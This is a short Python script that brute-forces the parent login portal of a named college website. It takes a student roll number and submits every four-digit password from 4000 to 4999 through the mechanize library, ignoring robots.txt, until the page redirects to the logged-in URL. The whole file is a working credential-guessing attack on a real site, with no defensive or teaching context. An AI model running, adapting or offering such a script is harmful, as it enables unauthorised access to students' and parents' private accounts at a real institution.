#!/usr/bin/python
import mechanize 
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

roll=str(raw_input("\n    Enter your u120 number  "))
#combos = itertools.permutations("1234567890",4) 
passw_perm=[]
passw_perm=range(4000,5000)
br.open("http://www.rajagiritech.ac.in/stud/parent/")
for x in passw_perm:	
	br.select_form("F1")
	br.form['user'] = roll
	br.form['pass'] = str(x)
	print "Checking ",br.form['pass']
	response=br.submit()
	if response.geturl()=="http://www.rajagiritech.ac.in/stud/parent/Parent.asp":
		#url to which the page is redirected after login
		print "Correct password is ",x
		break